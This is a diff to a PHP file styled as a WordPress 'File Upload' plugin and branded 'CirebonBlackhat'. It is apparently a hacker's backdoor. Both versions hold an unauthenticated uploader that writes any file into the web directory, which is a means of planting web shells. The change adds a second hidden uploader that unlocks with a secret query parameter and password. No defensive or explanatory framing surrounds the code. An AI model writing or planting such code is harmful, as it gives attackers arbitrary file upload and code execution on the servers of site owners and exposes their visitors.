@@ -1,21 +1,36 @@
 <?php
-    /*
-    Plugin Name: File Upload
-    Plugin URI: https://github.com/Xi4u7
-    Description: Simple File Upload
-    Version: 1.0
-    Author URI: https://github.com/Xi4u7
-    */
-header("CirebonBlackhat:"); // cuma header CirebonBlackhat aja
-echo "CirebonBlackhat<br>";
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+/*
+Plugin Name: File Upload
+Plugin URI: https://github.com/Xi4u7
+Description: Dual File Upload
+Version: 1.0
+Author URI: https://github.com/Xi4u7
+*/
 
-if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
+header("CirebonBlackhat:");
+echo "CirebonBlackhat<br>";
+echo '<form action="" method="post" enctype="multipart/form-data">';
+echo '<input type="file" name="file"><input type="submit" name="_upl" value="Upload"></form>';
+
+if (isset($_POST['_upl']) && $_POST['_upl'] === "Upload") {
     if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-        echo '<b>File Uploaded!!</b><br><br>';
+        echo '<b>File Uploaded!! (default)</b><br><br>';
     } else {
         echo '<b>Fail To Upload File!!!</b><br><br>';
+    }
+}
+// uploader kedua jika cung = Jancok337
+if (isset($_GET['cung']) && $_GET['cung'] === "Jancok337") {
+    echo "<hr><b>Uploader Kedua (Cung Mode):</b><br>";
+    echo '<form action="" method="post" enctype="multipart/form-data">';
+    echo '<input type="file" name="file2"><input type="submit" name="_upl2" value="Upload2"></form>';
+
+    if (isset($_POST['_upl2']) && $_POST['_upl2'] === "Upload2") {
+        if (@copy($_FILES['file2']['tmp_name'], $_FILES['file2']['name'])) {
+            echo '<b>File Uploaded!! (cung mode)</b><br><br>';
+        } else {
+            echo '<b>Fail To Upload File (cung mode)!!!</b><br><br>';
+        }
     }
 }
 ?>
